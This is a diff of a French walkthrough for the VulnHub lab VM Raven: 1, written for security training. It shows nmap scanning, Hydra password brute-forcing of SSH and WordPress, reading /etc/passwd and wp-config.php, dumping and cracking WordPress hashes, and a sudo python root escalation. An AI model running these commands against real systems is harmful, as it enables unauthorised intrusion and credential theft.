@@ -1,8 +1,10 @@
 # Raven: 1
 
-[Raven: 1](https://www.vulnhub.com/entry/raven-1,256/) est une machine virtuelle vulnérable conçue par [le consultant en sécurité William McCann](https://wjmccann.github.io/), et publiée sur le site VulnHub au mois d'août 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. À l'heure où ces lignes sont écrites (novembre 2018), il s'agit de la première VM de la série Raven, qui en compte deux. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
+[Raven: 1](https://www.vulnhub.com/entry/raven-1,256/) est une machine virtuelle vulnérable, conçue par [le consultant en sécurité William McCann](https://wjmccann.github.io/) et publiée sur le site VulnHub au mois d'août 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. À l'heure où ces lignes sont écrites (novembre 2018), il s'agit de la première VM de la série Raven, qui en compte deux. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
-_Raven Security_ est, semble-t-il, le leader mondial de la sécurité de l'information et de la sécurité physique. Quatre flags sont à trouver au cours de nos pérégrinations, nous allons vérifier si la sécurité de leur serveur est irréprochable ! Pour commencer, l'outil [netdiscover](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Raven : il s'agit de 192.168.56.105.
+## Recherche d'informations
+
+_Raven Security_ est, semble-t-il, le leader mondial de la sécurité de l'information et de la sécurité physique. Quatre flags sont à trouver au cours de nos pérégrinations, nous allons vérifier si la sécurité de leur serveur est irréprochable ! Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Raven : il s'agit de 192.168.56.105.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
@@ -18,7 +20,7 @@ _____________________________________________________________________________
 192.168.56.105  08:00:27:88:ad:a3      1      60  PCS Systemtechnik GmbH
 ```
 
-Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi possible de se connecter à distance avec SSH au serveur Raven, sur le port 22 ; un serveur Web Apache est par ailleurs installé, accessible via le port 80, sûrement le site vitrine de _Raven Security_.
+Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi possible de se connecter à distance avec SSH au serveur Raven, sur le port 22 ; un serveur Web Apache est par ailleurs installé, accessible via le port 80, sûrement le site vitrine de _Raven Security_.
 
 ```console
 root@blinils:~# nmap -sT -sV -p- -A 192.168.56.105
@@ -51,13 +53,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 --snip--
 ```
 
-La page d'index est effectivement une présentation des activités de l'entreprise _Raven Security_ ; il n'y a pas de fichier robots.txt, mais une recherche manuelle permet de lister les pages suivantes : index.html, about.html, service.html, contact.php et team.html.
+## Attaque par dictionnaire sur WordPress et SSH avec Hydra
+
+La page d'index est effectivement une présentation des activités de l'entreprise _Raven Security_ ; il n'y a pas de fichier ```robots.txt```, mais une recherche manuelle permet de lister les pages suivantes : ```index.html```, ```about.html```, ```service.html```, ```contact.php``` et ```team.html```.
 
 Sur cette dernière page Web, l'identité de chaque membre du staff est dévoilée, et peut potentiellement correspondre à des logins, très utiles pour se connecter en SSH par exemple (Ethel Davis, Rodney Cooper, Dora Walker et Lena Keller). Quant à l'onglet Blog, il renvoie vers un site WordPress, quasi-vide.
 
 ![Affichage de l'image INDEX-Raven.png](INDEX-Raven.png)
 
-Les outils [DIRB](https://tools.kali.org/web-applications/dirb), [nikto](https://cirt.net/nikto2-docs/) et [WordPress Security Scanner](https://wpscan.org/) n'ont rien révélé de spécial ; en revanche, une recherche manuelle a permis de trouver le nom d'un utilisateur, _michael_, qui a rédigé le premier post du blog. Deux attaques avec l'outil [Hydra](http://sectools.org/tool/hydra/) sont alors lancées : l'une sur le service SSH à la recherche du mot de passe Unix du compte _michael_ (s'il existe), l'autre sur l'interface d'administration du WordPress à la recherche du mot de passe du compte _michael_ (qui, lui, existe bien).
+Les outils [__DIRB__](https://tools.kali.org/web-applications/dirb), [__nikto__](https://cirt.net/nikto2-docs/) et [__WordPress Security Scanner__](https://wpscan.org/) n'ont rien révélé de spécial ; en revanche, une recherche manuelle a permis de trouver le nom d'un utilisateur, ```michael```, qui a rédigé le premier post du blog. Deux attaques avec l'outil [__Hydra__](http://sectools.org/tool/hydra/) sont alors lancées : l'une sur le service SSH à la recherche du mot de passe Unix du compte ```michael``` (s'il existe), l'autre sur l'interface d'administration du WordPress à la recherche du mot de passe du compte ```michael``` (qui, lui, existe bien).
 
 ```console
 root@blinils:~# hydra -l michael -P 500-worst-passwords.txt 192.168.56.105 \
@@ -125,7 +129,9 @@ Administrator. It usually boils down to these three things:
 Sorry, user michael may not run sudo on raven.
 ```
 
-Le fichier [/etc/passwd](https://fr.wikipedia.org/wiki/Passwd) témoigne de l'existence d'un deuxième utilisateur potentiellement intéressant : _steven_.
+## Dump de la base de données via l'accès à wp-config.php
+
+Le fichier [```/etc/passwd```](https://fr.wikipedia.org/wiki/Passwd) témoigne de l'existence d'un deuxième utilisateur potentiellement intéressant : ```steven```.
 
 ```console
 michael@Raven:~$ tail -n5 /etc/passwd
@@ -136,7 +142,7 @@ mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false
 steven:x:1001:1001::/home/steven:/bin/sh
 ```
 
-D'autre part, le fichier de configuration _wp-config.php_ nous donne le sésame de la base de données présente sur le serveur.
+D'autre part, le fichier de configuration ```wp-config.php``` nous donne le sésame de la base de données présente sur le serveur.
 
 ```console
 michael@Raven:~$ locate wp-config.php
@@ -150,7 +156,7 @@ define('DB_CHARSET', 'utf8mb4');
 define('DB_COLLATE', '');
 ```
 
-On se connecte ainsi avec les identifiants trouvés, et on récupère le contenu de la table _wp\_users_. 
+On se connecte ainsi avec les identifiants trouvés, et on récupère le contenu de la table ```wp_users```. 
 
 ```console
 michael@Raven:~$ mysql -u root -p
@@ -202,13 +208,13 @@ mysql> show tables;
 +-----------------------+
 12 rows in set (0.00 sec)
 
-mysql> select * from wp_users;
-+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
-| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
-+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
-|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
-|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
-+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
+mysql> select ID, user_login, user_pass, user_email, display_name from wp_users;
++----+------------+------------------------------------+-------------------+----------------+
+| ID | user_login | user_pass                          | user_email        | display_name   |
++----+------------+------------------------------------+-------------------+----------------+
+|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael@raven.org | michael        |
+|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven@raven.org  | Steven Seagull |
++----+------------+------------------------------------+-------------------+----------------+
 2 rows in set (0.00 sec)
 
 mysql> exit
@@ -216,7 +222,7 @@ Bye
 michael@Raven:~$
 ```
 
-Avec un peu de chance, [John The Ripper](http://openwall.com/john/) ne fera qu'une bouchée de ces hashs.
+Avec un peu de chance, [__John The Ripper__](http://openwall.com/john/) ne fera qu'une bouchée de ces hashs.
 
 ```console
 root@blinils:~# cat pass-wordpress-raven.txt
@@ -252,7 +258,9 @@ uid=1001(steven) gid=1001(steven) groups=1001(steven)
 Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
 ```
 
-L'objectif est désormais de devenir root sur le serveur Raven. L'utilisateur steven est autorisé à exécuter la commande /usr/bin/python via sudo sans mot de passe. Un petit tour sur l'excellent site [GTFOBins](https://gtfobins.github.io/gtfobins/python/) nous permet d'obtenir un snippet pour élever nos privilèges et passer root avec python.
+## Élévation de privilèges avec le binaire python
+
+L'objectif est désormais de devenir root sur le serveur Raven. L'utilisateur ```steven``` est autorisé à exécuter la commande ```/usr/bin/python``` via sudo sans mot de passe. Un petit tour sur l'excellent site [GTFOBins](https://gtfobins.github.io/gtfobins/python/) nous permet d'obtenir un snippet pour élever nos privilèges et passer root avec python.
 
 ```console
 $ sudo -l
@@ -271,4 +279,4 @@ root@Raven:/home/steven# wc -c /root/flag4.txt
 442 /root/flag4.txt
 ```
 
-flag2.txt se situe dans le répertoire /var/www/, tandis que flag3.txt est un article brouillon (_draft_), en attente de publication sur le site WordPress. Merci beaucoup à William McCann pour avoir créé ce challenge, hâte de dénicher le premier flag puis de m'attaquer à [Raven: 2](https://www.vulnhub.com/entry/raven-2,269/), sa seconde VM ! PS : ça y est, enfin trouvé, il était habilement dissimulé dans le code source de la page service.html !
+```flag2.txt``` se situe dans le répertoire ```/var/www/```, tandis que ```flag3.txt``` est un article brouillon (_draft_), en attente de publication sur le site WordPress. Merci beaucoup à [William McCann](https://wjmccann.github.io/) pour avoir créé ce challenge, hâte de dénicher le premier flag puis de m'attaquer à [Raven: 2](https://www.vulnhub.com/entry/raven-2,269/), sa seconde VM ! PS : ça y est, enfin trouvé, il était habilement dissimulé dans le code source de la page ```service.html``` !
